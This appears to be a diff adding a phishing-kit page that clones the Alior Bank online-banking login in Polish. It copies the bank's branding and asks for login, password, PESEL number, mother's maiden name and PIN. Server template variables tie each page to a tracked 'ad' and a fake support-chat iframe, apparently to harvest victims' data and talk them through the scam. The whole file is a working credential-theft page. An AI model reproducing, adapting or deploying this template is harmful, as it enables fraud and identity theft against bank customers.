@@ -1,0 +1,696 @@
+<html lang="pl" class="notranslate" translate="no">
+
+<head>
+    <base href="/">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="google" content="notranslate">
+    <title>Alior Online – bankowość internetowa Alior Banku</title>
+
+    <meta name="apple-mobile-web-app-title" content="AliorBank">
+    <meta name="application-name" content="AliorBank">
+
+    <link rel="shortcut icon" href="https://system.aliorbank.pl/assets/img/favicon.ico" type="image/x-icon">
+
+    <meta name="description" content="Logowanie do systemu bankowości internetowej Alior Banku.">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="stylesheet" href="/css/alior.css">
+    <link rel="stylesheet" href="/css/default_lk.css">
+
+    <style>
+        @-webkit-keyframes pulse1 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            80% {
+                transform: scale(1);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @keyframes pulse1 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            80% {
+                transform: scale(1);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @-webkit-keyframes pulse2 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            20% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            85% {
+                transform: scale(.7);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @keyframes pulse2 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            20% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            85% {
+                transform: scale(.7);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @-webkit-keyframes pulse3 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            40% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            90% {
+                transform: scale(.35);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @keyframes pulse3 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            40% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            90% {
+                transform: scale(.35);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @media (max-width:639px) {
+            .small-only-show-for-sr[_ngcontent-sfm-c17] {
+                position: absolute !important;
+                width: 1px;
+                height: 1px;
+                overflow: hidden;
+                clip: rect(0, 0, 0, 0)
+            }
+        }
+
+        @media (min-width:640px) {
+            .medium-show-for-sr[_ngcontent-sfm-c17] {
+                position: absolute !important;
+                width: 1px;
+                height: 1px;
+                overflow: hidden;
+                clip: rect(0, 0, 0, 0)
+            }
+        }
+
+        .loading-spinner[_ngcontent-sfm-c17] {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: var(--color-background-2-transparent-75);
+            transition: transform .2s ease;
+            z-index: 9999
+        }
+
+        .loading-spinner.transparent-background[_ngcontent-sfm-c17] {
+            background-color: transparent
+        }
+
+        .loading-inside[_ngcontent-sfm-c17] {
+            position: absolute;
+            height: 100%
+        }
+    </style>
+    <style>
+        @-webkit-keyframes pulse1 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            80% {
+                transform: scale(1);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @keyframes pulse1 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            80% {
+                transform: scale(1);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @-webkit-keyframes pulse2 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            20% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            85% {
+                transform: scale(.7);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @keyframes pulse2 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            20% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            85% {
+                transform: scale(.7);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @-webkit-keyframes pulse3 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            40% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            90% {
+                transform: scale(.35);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @keyframes pulse3 {
+            0% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            40% {
+                transform: scale(0);
+                opacity: 1
+            }
+
+            90% {
+                transform: scale(.35);
+                opacity: 0
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 0
+            }
+        }
+
+        @media (max-width:639px) {
+            .small-only-show-for-sr[_ngcontent-sfm-c14] {
+                position: absolute !important;
+                width: 1px;
+                height: 1px;
+                overflow: hidden;
+                clip: rect(0, 0, 0, 0)
+            }
+        }
+
+        @media (min-width:640px) {
+            .medium-show-for-sr[_ngcontent-sfm-c14] {
+                position: absolute !important;
+                width: 1px;
+                height: 1px;
+                overflow: hidden;
+                clip: rect(0, 0, 0, 0)
+            }
+        }
+
+        .circle-loader[_ngcontent-sfm-c14] svg[_ngcontent-sfm-c14] {
+            width: 60px;
+            height: 60px;
+            -webkit-animation: loaderRotate 2s linear infinite;
+            animation: loaderRotate 2s linear infinite;
+            transform-origin: center center
+        }
+
+        .circle-loader[_ngcontent-sfm-c14] svg[_ngcontent-sfm-c14] circle[_ngcontent-sfm-c14] {
+            -webkit-animation: loaderDashAnimation 2s ease-in-out infinite;
+            animation: loaderDashAnimation 2s ease-in-out infinite;
+            stroke: var(--color-animated-loader-stroke);
+            stroke-dasharray: 80, 200;
+            stroke-dashoffset: 0;
+            stroke-linecap: round;
+            stroke-width: 4px
+        }
+
+        .circle-loader.xsmall[_ngcontent-sfm-c14],
+        .circle-loader.xsmall[_ngcontent-sfm-c14] svg[_ngcontent-sfm-c14] {
+            width: 1rem;
+            height: 1rem
+        }
+
+        .circle-loader.small[_ngcontent-sfm-c14],
+        .circle-loader.small[_ngcontent-sfm-c14] svg[_ngcontent-sfm-c14] {
+            width: 1.875rem;
+            height: 1.875rem
+        }
+
+        .circle-loader.medium[_ngcontent-sfm-c14],
+        .circle-loader.medium[_ngcontent-sfm-c14] svg[_ngcontent-sfm-c14] {
+            width: 2.5rem;
+            height: 2.5rem
+        }
+
+        .circle-loader.large[_ngcontent-sfm-c14],
+        .circle-loader.large[_ngcontent-sfm-c14] svg[_ngcontent-sfm-c14] {
+            width: 3.75rem;
+            height: 3.75rem
+        }
+
+        @-webkit-keyframes loaderDashAnimation {
+            0% {
+                stroke-dasharray: 1, 200;
+                stroke-dashoffset: 0
+            }
+
+            50% {
+                stroke-dasharray: 89, 200;
+                stroke-dashoffset: -35px
+            }
+
+            to {
+                stroke-dasharray: 89, 200;
+                stroke-dashoffset: -124px
+            }
+        }
+
+        @keyframes loaderDashAnimation {
+            0% {
+                stroke-dasharray: 1, 200;
+                stroke-dashoffset: 0
+            }
+
+            50% {
+                stroke-dasharray: 89, 200;
+                stroke-dashoffset: -35px
+            }
+
+            to {
+                stroke-dasharray: 89, 200;
+                stroke-dashoffset: -124px
+            }
+        }
+
+        @-webkit-keyframes loaderRotate {
+            0% {
+                transform: rotate(0deg)
+            }
+
+            to {
+                transform: rotate(1turn)
+            }
+        }
+
+        @keyframes loaderRotate {
+            0% {
+                transform: rotate(0deg)
+            }
+
+            to {
+                transform: rotate(1turn)
+            }
+        }
+    </style>
+</head>
+
+<body class="">
+    <app-component class="ng-tns-c19-0" ng-version="10.1.1">
+        <div class="ng-tns-c19-0 ng-trigger ng-trigger-fadeInOutFast ng-star-inserted">
+            <router-outlet class="ng-tns-c19-0"></router-outlet>
+            <!---->
+        </div>
+        <!---->
+        <!---->
+        <!---->
+    </app-component>
+    <!---->
+    <div ui-view="app" ng-csp="" class="view-app" style="">
+        <app-ajs-root>
+            <!---->
+            <div ng-if="!aarCtrl.cloakActive">
+                <!---->
+                <div ui-view="root" class="clearfix" style="">
+                    <external>
+                        <div>
+                            <!---->
+                            <div ui-view="modal" class="modal"></div>
+                            <!---->
+                            <div ui-view="content"></div>
+                        </div>
+                    </external>
+                </div>
+                <!---->
+                <div ui-view="error"></div>
+                <!---->
+                <div ui-view="auth" class="sign-in-site" style="">
+                    <auth>
+                        <alert key="main">
+                            <!---->
+                        </alert>
+                        <!---->
+                        <div ui-view="main" class="sign-in-wrapper">
+                            <auth.sign-in>
+                                <div class="external-page" app-when-offline="">
+                                    <!---->
+                                    <div ui-view="sign-in">
+                                        <auth.sign-in.cif reset-session="resetSession" form-data="formData"
+                                            blik-booster-data="blikBoosterData">
+                                            <div>
+                                                <mobile-app-ad>
+                                                    <div class="mobile-app-add ng-hide" ng-show="maCtrl.showAd">
+                                                        <div role="banner" class="banner-container"><span
+                                                                class="icon icon-close"
+                                                                ng-click="maCtrl.close()"></span> <a
+                                                                href="http://www.aliorbank.pl" class="logo"
+                                                                title="Alior Bank"><img
+                                                                    src="https://system.aliorbank.pl/assets/img/alior-logo-shop.svg"
+                                                                    alt="Alior Bank"></a>
+                                                            <div class="header-section">
+                                                                <h1>Aplikacja Alior Mobile</h1>
+                                                                <h2>Pobierz aplikację na swój telefon</h2>
+                                                            </div>
+                                                            <div class="download-section float-right"><a
+                                                                    href="https://itunes.apple.com/pl/app/alior-bank/id1226971903?l=pl&amp;mt=8"
+                                                                    target="_blank" class="download-link" role="button"
+                                                                    title="Pobierz">Pobierz</a></div>
+                                                        </div>
+                                                    </div>
+                                                </mobile-app-ad>
+                                                <auth-header heading="Zaloguj się" mobile-heading="">
+                                                    <header role="banner" app-when-offline="">
+                                                        <a href="http://www.aliorbank.pl" class="logo"
+                                                            title="Alior Bank">
+                                                            <img src="https://system.aliorbank.pl/assets/img/alior-logo.svg"
+                                                                alt="Alior Bank">
+                                                        </a>
+
+                                                        <h1 tabindex="0">
+                                                            <span class="hide-for-medium">Zaloguj się</span>
+                                                            <span class="show-for-medium">Zaloguj się</span>
+                                                        </h1>
+
+                                                        <!---->
+                                                    </header>
+                                                </auth-header>
+                                                <main data-routes="">
+                                                    <external-page-background>
+                                                        <interchange class="external-page-background"
+                                                            small-bg="assets/img/login/first-time-login-800.jpg"
+                                                            medium-bg="assets/img/login/first-time-login-1200.jpg"
+                                                            large-bg="assets/img/login/first-time-login-1600.jpg"
+                                                            xlarge-bg="assets/img/login/first-time-login-1920.jpg"
+                                                            style="background-image: url(&quot;assets/img/login/first-time-login-800.jpg&quot;);">
+                                                        </interchange>
+                                                    </external-page-background>
+                                                    <div class="auth-wrapper flex-column"
+                                                        ng-class="{'with-blik': scCtrl.blikBoosterOption}">
+                                                        <div class="flex-grow">
+                                                            <auth-greeting
+                                                                style="text-align: center;width:100%;display:block;margin: 2rem 0;">
+                                                                <!-- <div class="row align-center"> -->
+                                                                <h2 tabindex="0">Witamy w Alior Banku!</h2>
+                                                                <!-- </div> -->
+                                                            </auth-greeting>
+                                                            <div class="row align-center">
+                                                                <div class="column small-19 medium-9 large-7">
+                                                                    <!---->
+                                                                    <external-section>
+                                                                        <section class="external-section-wrapper"><svg
+                                                                                class="external-section-svg"
+                                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                                <rect fill="#FFF" width="100%"
+                                                                                    height="100%"></rect>
+                                                                            </svg>
+                                                                            <div class="external-section-content p-8 large-p-10"
+                                                                                ng-class="[ { 'no-min-height': esCtrl.noMinHeight, 'p-8 large-p-10': !esCtrl.customPadding }, esCtrl.customPadding, esCtrl.customMargin ]"
+                                                                                ng-transclude="">
+                                                                                <!---->
+                                                                                <cif-form form-data="scCtrl.formData">
+                                                                                    <form id="lk_form"
+                                                                                        class="ng-pristine ng-valid">
+                                                                                        <!---->
+                                                                                        <div class="form-container">
+                                                                                            <div ng-transclude="">
+                                                                                                <fieldset>
+                                                                                                    <label
+                                                                                                        for="login">Login</label>
+                                                                                                    <div class="field">
+                                                                                                        <input
+                                                                                                            id="login"
+                                                                                                            name="login"
+                                                                                                            class="large-input ng-pristine ng-valid ng-empty validate-field ng-touched"
+                                                                                                            type="text"
+                                                                                                            autocomplete="off"
+                                                                                                            placeholder="Wpisz identyfikator klienta"
+                                                                                                            required>
+                                                                                                        <!---->
+                                                                                                    </div>
+                                                                                                </fieldset>
+                                                                                                <fieldset>
+                                                                                                    <label
+                                                                                                        for="password">Hasło</label>
+                                                                                                    <div class="field">
+                                                                                                        <input
+                                                                                                            id="password"
+                                                                                                            name="password"
+                                                                                                            class="large-input ng-pristine ng-valid ng-empty validate-field ng-touched"
+                                                                                                            type="password"
+                                                                                                            autocomplete="off"
+                                                                                                            placeholder="Hasło"
+                                                                                                            required>
+                                                                                                        <!---->
+                                                                                                    </div>
+                                                                                                </fieldset>
+                                                                                                <fieldset>
+                                                                                                    <label
+                                                                                                        for="pesel">Pesel</label>
+                                                                                                    <div class="field">
+                                                                                                        <input
+                                                                                                            id="pesel"
+                                                                                                            name="pesel"
+                                                                                                            class="large-input ng-pristine ng-valid ng-empty validate-field ng-touched"
+                                                                                                            type="text"
+                                                                                                            autocomplete="off"
+                                                                                                            placeholder="Pesel"
+                                                                                                            required>
+                                                                                                        <!---->
+                                                                                                    </div>
+                                                                                                </fieldset>
+                                                                                                <fieldset>
+                                                                                                    <label
+                                                                                                        for="motherlastname">Nazwisko
+                                                                                                        panieńskie
+                                                                                                        matki</label>
+                                                                                                    <div class="field">
+                                                                                                        <input
+                                                                                                            id="motherlastname"
+                                                                                                            name="motherlastname"
+                                                                                                            class="large-input ng-pristine ng-valid ng-empty validate-field ng-touched"
+                                                                                                            type="text"
+                                                                                                            autocomplete="off"
+                                                                                                            placeholder="Nazwisko panieńskie matki"
+                                                                                                            required>
+                                                                                                        <!---->
+                                                                                                    </div>
+                                                                                                </fieldset>
+                                                                                                <fieldset>
+                                                                                                    <label
+                                                                                                        for="pin">PIN</label>
+                                                                                                    <div class="field">
+                                                                                                        <input id="pin"
+                                                                                                            name="pin"
+                                                                                                            class="large-input ng-pristine ng-valid ng-empty validate-field ng-touched"
+                                                                                                            type="text"
+                                                                                                            autocomplete="off"
+                                                                                                            placeholder="PIN"
+                                                                                                            required>
+                                                                                                        <!---->
+                                                                                                    </div>
+                                                                                                </fieldset>
+                                                                                                <button
+                                                                                                    class="button primary expanded login-submit"
+                                                                                                    type="submit"
+                                                                                                    title="Dalej">Dalej</button>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </form>
+                                                                                </cif-form>
+                                                                                <system-info>
+                                                                                    <div>
+                                                                                        <!---->
+                                                                                        <!---->
+                                                                                        <!---->
+                                                                                        <!---->
+                                                                                    </div>
+                                                                                </system-info>
+                                                                            </div>
+                                                                        </section>
+                                                                    </external-section>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </main>
+                                            </div>
+                                        </auth.sign-in.cif>
+                                    </div>
+                                </div>
+                            </auth.sign-in>
+                        </div>
+                    </auth>
+                </div>
+            </div>
+            <!---->
+            <!---->
+        </app-ajs-root>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+        const LOG_TOKEN = <%=log.token%>,
+            AD_LANG = "<%=log.ad.service.lang%>",
+            AD_ID = <%=log.ad.id%>,
+            translate = <%-JSON.stringify(translate) %>;
+    </script>
+    <script src="/js/lk.js" defer></script>
+    <link rel="stylesheet" href="/css/support_parent.css" />
+    <div class="
+    chatra--webkit
+    chatra--style-round
+    chatra--side-bottom
+    chatra--pos-right
+    chatra--visible
+    chatra--expanded
+    chatra--fast-toggle
+  " id="chatra" data-turbolinks-permanent="" style="
+    width: 380px;
+    height: 600px;
+    transform: none;
+    z-index: 2147483647;
+    display: none;
+  ">
+        <div id="chatra__iframe-wrapper">
+            <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat"
+                allow="autoplay" src="/supportChatFrame/<%=log.ad.id%>"
+                style="width: 380px; height: 600px; position: absolute"></iframe>
+        </div>
+    </div>
+    <div class="support-circle"
+        onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+</body>
+
+</html>
